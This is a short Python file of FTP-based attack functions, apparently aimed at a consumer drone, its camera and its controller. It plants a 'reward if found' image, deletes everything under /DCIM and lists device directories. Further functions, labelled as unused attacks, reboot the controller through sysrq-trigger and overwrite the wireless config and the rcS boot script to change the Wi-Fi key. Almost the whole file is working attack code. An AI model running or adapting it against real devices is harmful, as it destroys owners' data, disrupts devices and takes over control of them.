from ftplib import FTP
import os


def plantrecoveryimage(ftp):
    
    try:
        ftp.storbinary('STOR /DCIM/100MEDIA/READ-REWARD-IF-FOUND.jpg', open('../res/img/READ-REWARD-IF-FOUND.jpg', 'rb'))
    except:
        ftp.storbinary('STOR /DCIM/READ-REWARD-IF-FOUND.jpg', open('../res/img/READ-REWARD-IF-FOUND.jpg', 'rb'))
    
    
def cleardcim(ftp):
    
    ftp.cwd('/DCIM')
    for item in ftp.nlst():
        try:
             ftp.delete(item)
        except Exception:
             ftp.rmd(item)
                
                
def gatherinteldrone(ftp):
    print 'gather drone intel'
    ftp.cwd('run')
    ftp.retrlines('LIST')

def gatherintelcamera(ftp):
    print 'gather camera intel'
    ftp.retrlines('LIST')

def gatherintelcontroller(ftp):
    print 'gather controller intel'
    ftp.cwd('run')
    ftp.retrlines('LIST')
                

########UNUSED ATTACKS BELOW########

def rebootcontroller(ftp):
    
    ftp.cwd('/proc/')
    ftp.sendcmd('put ../res/payloads/sysrq-trigger')
                
def changepsk(psk, ftp):

    assert (len(psk) >= 8), 'PSK must be at least 8 characters'
    
    # update config files with new PSK
    ftp.cwd('/etc/config/')
    ftp.sendcmd('put wireless_*')
    
    # update boot file with commands to export config files
    ftp.cwd('/etc/init.d/')
    ftp.sendcmd('put rcS')
    
    # trigger system reboot
    ftp.cwd('/proc/')
    ftp.sendcmd('put sysrq-trigger')
    
    ftp.quit()
    
    